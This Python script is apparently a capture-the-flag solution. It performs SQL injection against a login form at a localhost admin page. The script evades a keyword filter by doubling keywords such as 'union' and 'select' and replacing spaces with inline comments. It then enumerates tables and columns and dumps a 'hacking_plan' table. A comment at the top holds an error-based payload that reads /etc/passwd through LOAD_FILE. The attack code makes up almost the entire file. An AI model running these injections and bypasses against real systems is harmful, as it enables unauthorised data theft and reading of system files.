import requests

# test'/*a*/AND/*a*/EXTRACTVALUE(7281,CONCAT(0x5c,0x7171626271,(MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f706173737764))/*a*/AS/*a*/NCHAR),0x20)),1927,18)),0x71626b7671))/*a*/AND/*a*/'JUnb'='

blacklist = {
    'union': 'uunionnion',
    'select': 'sselectelect',
    'or': 'oorr',
    'from': 'ffromrom',
    'where': 'wwherehere',
    'outfile': 'ooutfileutfile'
}

def modify(payload):
    inp = payload.split()
    for i in range(len(inp)):
        for key, value in blacklist.items():
            if inp[i] == key:
                inp[i] = value

    payload = " ".join(inp)
    generated = payload.replace(" ", "/*a*/")
    return generated

def get_tables():
    tables = []

    for idx in range(0xff):
        url = "http://localhost:9999/admin.php"
        payload = f"' union select table_name,2,3,4 from infoorrmation_schema.tables limit {idx},1 #"

        data = {
            "username": modify(payload),
            "password": "test" 
        }

        response = requests.post(url, data=data)
        table = response.text.split()[-13][:-13]
        print(table)
        tables.append(table)

    print(tables)

def get_column(table_name):
    columns = []

    for idx in range(9): # our target is 9 duhh
        url = "http://localhost:9999/admin.php"
        payload = f"' union select column_name,2,3,4 from infoorrmation_schema.columns where table_name = '{table_name}' limit {idx},1 #"

        data = {
            "username": modify(payload),
            "password": "test" 
        }

        response = requests.post(url, data=data)
        column = response.text.split()[-13][:-13]
        print(column)
        columns.append(column)

    print(columns)


def hacking_plan():
    columns = ['id', 'target', 'method', 'tools', 'start_date', 'end_date', 'status', 'description', 'created_at']

    for value in columns:
        for i in range(50):
            url = "http://localhost:9999/admin.php"
            payload = f"' union select {value},2,3,4 from ics.hacking_plan limit {i},1 #"

            data = {
                "username": modify(payload),
                "password": "test" 
            }

            response = requests.post(url, data=data)
            result = response.text.split()[-13][:-13]
            if len(result) == 0:
                break
            else:
                print(result)
            
        print("\n")



def main():
    print("1. Enumerate Tables\n2. Get column\n3. Dump hacking_plan")
    inp = int(input("prompt> "))

    if inp == 1:
        get_tables()
    elif inp == 2:
        table_name = input("Enter table name: ")
        get_column(table_name)
    elif inp == 3:
        hacking_plan()

if __name__ == '__main__':
    main()
